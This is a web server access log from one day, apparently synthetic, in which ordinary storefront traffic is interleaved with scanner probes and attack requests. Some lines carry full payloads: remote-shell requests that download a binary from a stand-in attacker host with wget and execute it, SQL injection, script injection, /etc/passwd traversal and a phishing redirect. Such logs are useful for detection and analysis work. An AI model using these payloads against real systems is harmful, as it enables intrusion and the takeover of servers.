10.0.0.23 - - [21/May/2026:09:55:56 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 6311 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:09:06:53 +0000] "POST /wp-content/themes/ HTTP/1.1" 404 848 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:14:39:48 +0000] "GET /search?q=laptop HTTP/1.1" 200 5987 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
185.220.101.45 - - [21/May/2026:19:44:34 +0000] "GET /wp-content/plugins/ HTTP/1.1" 200 4564 "-" "ffuf/2.1.0"
198.51.100.78 - - [21/May/2026:13:47:28 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 200 7649 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:10:24:24 +0000] "GET /static/img/logo.png HTTP/1.1" 200 3289 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.155.205.33 - - [21/May/2026:09:53:33 +0000] "GET /wp-login.php HTTP/1.1" 403 1126 "-" "gobuster/3.6"
203.0.113.10 - - [21/May/2026:09:34:45 +0000] "GET / HTTP/1.1" 200 7222 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.155.205.33 - - [21/May/2026:14:00:57 +0000] "GET /login HTTP/1.1" 401 877 "-" "gobuster/3.6"
10.0.0.22 - - [21/May/2026:18:12:05 +0000] "GET /contact HTTP/1.1" 200 7491 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.46 - - [21/May/2026:17:12:29 +0000] "GET /product?id=1%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1" 200 3040 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:18:21:57 +0000] "GET /contact HTTP/1.1" 200 4610 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:15:43:07 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 7525 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.13 - - [21/May/2026:10:53:56 +0000] "GET /about HTTP/1.1" 200 5251 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
185.220.101.45 - - [21/May/2026:11:36:52 +0000] "GET /phpMyAdmin HTTP/1.1" 404 770 "-" "gobuster/3.6"
192.168.1.11 - - [21/May/2026:14:25:14 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 404 946 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:09:13:49 +0000] "GET /checkout HTTP/1.1" 200 2748 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:15:49:55 +0000] "GET /search?q=phone HTTP/1.1" 200 6996 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
185.220.101.45 - - [21/May/2026:08:49:44 +0000] "GET /wp-login.php HTTP/1.1" 404 1177 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
192.168.1.12 - - [21/May/2026:18:22:10 +0000] "GET /static/img/logo.png HTTP/1.1" 200 6995 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:16:20:10 +0000] "GET /checkout HTTP/1.1" 200 1313 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.10 - - [21/May/2026:20:23:30 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 3038 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:09:20:26 +0000] "POST /wp-login.php HTTP/1.1" 302 796 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:15:27:00 +0000] "GET /products/12 HTTP/1.1" 200 5843 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:10:58:20 +0000] "GET /contact HTTP/1.1" 200 4794 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:19:31:37 +0000] "GET /static/css/style.css HTTP/1.1" 200 3087 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:16:45:58 +0000] "GET /static/css/style.css HTTP/1.1" 200 8891 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:17:42:23 +0000] "GET /index.html HTTP/1.1" 200 5132 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:18:46:04 +0000] "GET /phpMyAdmin HTTP/1.1" 200 7208 "-" "ffuf/2.1.0"
203.0.113.11 - - [21/May/2026:19:01:58 +0000] "GET /search?q=laptop HTTP/1.1" 200 7504 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:16:04:45 +0000] "GET /products/12 HTTP/1.1" 200 8626 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:20:16:24 +0000] "GET /contact HTTP/1.1" 200 1810 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:08:04:22 +0000] "GET /wp-content/plugins/ HTTP/1.1" 404 1107 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:09:14:43 +0000] "GET /products HTTP/1.1" 200 5334 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.77 - - [21/May/2026:09:58:52 +0000] "GET /wp-admin/ HTTP/1.1" 302 571 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.77 - - [21/May/2026:12:41:07 +0000] "GET /xmlrpc.php HTTP/1.1" 200 5102 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:17:35:15 +0000] "GET /cart HTTP/1.1" 200 1074 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:08:40:46 +0000] "GET / HTTP/1.1" 200 6716 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:15:28:17 +0000] "GET /index.html HTTP/1.1" 200 1971 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:14:26:29 +0000] "GET /static/css/style.css HTTP/1.1" 200 5973 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.45 - - [21/May/2026:11:56:35 +0000] "GET /shell?cd%2B/tmp%3Bwget%2Bhttp%3A//malicious.example/bin%3Bchmod%2B777%2Bbin%3B./bin HTTP/1.1" 403 1114 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:08:27:04 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 404 590 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:16:22:52 +0000] "GET /checkout HTTP/1.1" 200 4690 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:13:36:34 +0000] "GET /search?q=laptop HTTP/1.1" 200 7937 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:19:51:07 +0000] "GET /products/43 HTTP/1.1" 200 6945 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.45 - - [21/May/2026:18:50:22 +0000] "GET /search?q=%22%20OR%20%221%22%3D%221 HTTP/1.1" 404 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.78 - - [21/May/2026:16:56:37 +0000] "GET /phpmyadmin HTTP/1.1" 302 221 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:10:12:07 +0000] "GET /api/v1/status HTTP/1.1" 200 1661 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:11:38:39 +0000] "GET /api/v1/status HTTP/1.1" 404 279 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.78 - - [21/May/2026:13:56:58 +0000] "POST /.git/config HTTP/1.1" 403 956 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:15:23:10 +0000] "GET /index.html HTTP/1.1" 200 1958 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:19:06:10 +0000] "GET /server-status HTTP/1.1" 403 418 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:12:13:50 +0000] "GET /products/43 HTTP/1.1" 200 2019 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:16:40:30 +0000] "GET /cart HTTP/1.1" 200 7537 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:08:08:58 +0000] "GET /about HTTP/1.1" 200 6726 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.155.205.33 - - [21/May/2026:13:09:10 +0000] "POST /phpmyadmin HTTP/1.1" 403 1116 "-" "Skipfish/2.10b"
192.168.1.12 - - [21/May/2026:13:16:22 +0000] "GET /static/img/logo.png HTTP/1.1" 200 2244 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:08:59:02 +0000] "GET / HTTP/1.1" 200 6256 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.45 - - [21/May/2026:15:46:16 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 1146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:12:27:40 +0000] "POST /api/v1/user/profile HTTP/1.1" 200 8086 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:17:08:12 +0000] "GET /products/12 HTTP/1.1" 200 2319 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.155.205.33 - - [21/May/2026:11:12:30 +0000] "POST /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 909 "-" "WPScan v3.8.25"
172.16.0.45 - - [21/May/2026:17:58:29 +0000] "GET /search?q=%22%20OR%20%221%22%3D%221 HTTP/1.1" 403 788 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:10:33:47 +0000] "GET /checkout HTTP/1.1" 200 8128 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:08:28:09 +0000] "POST /api/v1/user/profile HTTP/1.1" 200 3901 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:15:00:20 +0000] "GET /api/v1/status HTTP/1.1" 200 515 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:14:30:02 +0000] "GET /cart HTTP/1.1" 200 3855 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.13 - - [21/May/2026:18:22:42 +0000] "GET /index.html HTTP/1.1" 200 2557 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:08:42:58 +0000] "GET /index.html HTTP/1.1" 200 6929 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:16:45:01 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 5603 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:18:21:54 +0000] "GET /search?q=laptop HTTP/1.1" 200 8420 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:11:40:11 +0000] "GET /static/css/style.css HTTP/1.1" 200 6978 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:09:47:43 +0000] "GET /search?q=laptop HTTP/1.1" 200 7477 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.23 - - [21/May/2026:08:30:33 +0000] "GET /products/12 HTTP/1.1" 200 6749 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:12:51:19 +0000] "POST /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 404 1132 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:17:59:32 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 302 204 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:14:34:59 +0000] "GET /index.html HTTP/1.1" 200 2678 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.12 - - [21/May/2026:15:47:46 +0000] "POST /api/v1/user/profile HTTP/1.1" 200 1426 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:11:34:41 +0000] "GET /static/img/logo.png HTTP/1.1" 200 3928 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:20:24:53 +0000] "GET / HTTP/1.1" 200 3993 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:13:05:02 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 544 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:12:20:49 +0000] "GET /static/css/style.css HTTP/1.1" 200 3849 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:11:21:02 +0000] "GET /products/12 HTTP/1.1" 200 4340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:08:45:39 +0000] "GET /products HTTP/1.1" 200 1852 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
185.220.101.45 - - [21/May/2026:08:28:56 +0000] "GET /redirect?url=http%3A%2F%2Fevil.example%2Fphish HTTP/1.1" 403 698 "-" "WPScan v3.8.25"
10.0.0.21 - - [21/May/2026:16:28:01 +0000] "POST /api/v1/user/profile HTTP/1.1" 200 6235 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [21/May/2026:15:49:53 +0000] "GET / HTTP/1.1" 200 4255 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:15:55:44 +0000] "GET /products HTTP/1.1" 200 6317 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:13:40:27 +0000] "GET /about HTTP/1.1" 200 8031 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:13:19:35 +0000] "GET /static/css/style.css HTTP/1.1" 200 7671 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:09:55:31 +0000] "GET /cart HTTP/1.1" 200 4059 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:12:44:58 +0000] "GET /index.html HTTP/1.1" 200 7149 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:09:32:59 +0000] "GET /search?q=phone HTTP/1.1" 404 147 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:17:30:02 +0000] "GET /admin HTTP/1.1" 500 297 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
192.168.1.13 - - [21/May/2026:13:21:47 +0000] "GET /checkout HTTP/1.1" 200 3138 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:10:22:16 +0000] "GET /static/js/app.js HTTP/1.1" 200 6007 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.77 - - [21/May/2026:16:35:22 +0000] "GET /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 200 6869 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:16:59:19 +0000] "GET /about HTTP/1.1" 200 3611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.78 - - [21/May/2026:12:51:56 +0000] "POST /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 310 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:10:01:37 +0000] "GET /products/43 HTTP/1.1" 200 3542 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:13:40:04 +0000] "GET /contact HTTP/1.1" 200 5870 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:17:48:41 +0000] "GET /search?q=laptop HTTP/1.1" 200 4713 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:11:04:23 +0000] "GET /search?q=laptop HTTP/1.1" 200 6711 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:09:25:50 +0000] "GET /checkout HTTP/1.1" 200 5331 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
185.220.101.45 - - [21/May/2026:17:04:51 +0000] "GET /wp-admin/ HTTP/1.1" 404 508 "-" "Hydra"
203.0.113.11 - - [21/May/2026:18:06:33 +0000] "GET /about HTTP/1.1" 200 6869 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:14:13:26 +0000] "GET /api/v1/user/profile HTTP/1.1" 404 720 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:12:33:40 +0000] "GET /api/v1/status HTTP/1.1" 200 2733 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:08:03:41 +0000] "GET /static/css/style.css HTTP/1.1" 200 7543 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:17:49:33 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 1825 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:17:22:11 +0000] "GET /static/css/style.css HTTP/1.1" 200 2828 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:08:10:38 +0000] "GET /products/12 HTTP/1.1" 200 2576 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:18:28:25 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 835 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:18:10:05 +0000] "GET /api/v1/status HTTP/1.1" 200 8255 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
45.155.205.33 - - [21/May/2026:13:06:25 +0000] "POST /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 403 179 "-" "gobuster/3.6"
172.16.0.45 - - [21/May/2026:15:27:21 +0000] "GET /search?q=%22%20OR%20%221%22%3D%221 HTTP/1.1" 403 321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
